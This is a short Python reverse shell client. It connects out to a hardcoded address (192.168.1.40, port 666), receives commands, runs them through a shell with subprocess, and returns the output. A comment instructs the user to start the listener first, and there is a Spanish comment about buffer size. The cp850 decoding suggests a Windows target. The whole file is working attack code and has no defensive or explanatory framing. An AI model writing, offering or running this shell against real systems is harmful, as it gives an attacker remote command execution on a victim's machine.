#!/usr/bin/env python3
import socket
import subprocess

# FIRST: start the listener

def run_command(command):
    command_output = subprocess.check_output(command, shell=True).decode("cp850")
    return command_output

if __name__ == '__main__':
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(("192.168.1.40", 666))

    while True:
        command = client_socket.recv(1024).decode().strip() # para respuestas más largas ampliar el control de bytes
        command_output = run_command(command)
        client_socket.send(b"\n" + command_output.encode() + b"\n")

    client_socket.close()